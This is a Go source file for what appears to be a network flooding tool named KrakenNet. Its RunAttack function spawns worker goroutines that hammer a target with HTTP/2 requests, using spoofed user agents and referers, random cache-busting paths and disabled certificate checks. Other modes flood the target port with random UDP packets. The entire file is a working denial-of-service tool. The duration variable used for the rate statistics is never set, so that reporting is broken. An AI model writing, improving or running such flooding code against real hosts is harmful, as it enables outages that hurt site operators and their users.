package pkg

import (
	"bufio"
	"crypto/tls"
	"fmt"
	color "github.com/vexsx/KrakenNet/config"
	"golang.org/x/net/context"
	"golang.org/x/net/http2"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD"}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
}

func randomReferer() string {
	return randomFromList(referers, "https://google.com/")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func newHTTPClientTLS(connections int) *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     15 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func sendUDP(conn net.Conn, payload []byte) bool {
	_, err := conn.Write(payload)
	return err == nil
}

func formatBytes(bytes float64) string {
	units := []string{"Bps", "KBps", "MBps", "GBps"}
	i := 0
	for bytes >= 1024 && i < len(units)-1 {
		bytes /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", bytes, units[i])
}

func (in *Inputs) RunAttack() {
	rand.Seed(time.Now().UnixNano())
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")
	var durationSec int64

	fmt.Println(color.Green + "🚀 Attack starting..." + color.Reset)

	var totalSuccess int64
	var totalFail int64
	var totalBytes int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), in.Duration)
	defer cancel()

	for i := 0; i < in.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			switch in.Method {
			case 1, 2:
				client := newHTTPClientTLS(in.Connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < in.Connections; j++ {
							if sendTLSRequest(client, in.Target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}

			case 3, 4, 5:
				conns := make([]net.Conn, in.Connections)
				for i := 0; i < in.Connections; i++ {
					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", in.Target, in.Port))
					if err != nil {
						continue
					}
					conns[i] = c
				}
				defer func() {
					for _, c := range conns {
						if c != nil {
							c.Close()
						}
					}
				}()

				payloadSize := 1024
				if in.Method == 5 {
					payloadSize = 8192
				}

				for {
					select {
					case <-ctx.Done():
						return
					default:
						for _, c := range conns {
							if c != nil {
								payload := generatePayload(payloadSize)
								if sendUDP(c, payload) {
									atomic.AddInt64(&totalSuccess, 1)
									atomic.AddInt64(&totalBytes, int64(len(payload)))
								} else {
									atomic.AddInt64(&totalFail, 1)
								}
							}
						}
					}
				}
			}
		}()
	}

	wg.Wait()

	if in.Method == 2 || in.Method == 1 {
		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
		rps := float64(total) / float64(durationSec)
		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
		fmt.Printf("%s✅ Success requests : %d%s\n", color.Green, totalSuccess, color.Reset)
		fmt.Printf("%s❌ Failed requests  : %d%s\n", color.Red, totalFail, color.Reset)
		fmt.Printf("%s⏱️ Duration         : %d seconds%s\n", color.Cyan, durationSec, color.Reset)
		fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", color.Yellow, rps, color.Reset)
	} else {
		bytes := atomic.LoadInt64(&totalBytes)
		bps := float64(bytes) / float64(durationSec)
		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
		fmt.Printf("%s✅ Success packets : %d%s\n", color.Green, totalSuccess, color.Reset)
		fmt.Printf("%s❌ Failed packets  : %d%s\n", color.Red, totalFail, color.Reset)
		fmt.Printf("%s⏱️ Duration        : %d seconds%s\n", color.Cyan, durationSec, color.Reset)
		fmt.Printf("%s📈 Average BPS     : %s%s\n", color.Yellow, formatBytes(bps), color.Reset)
	}
}
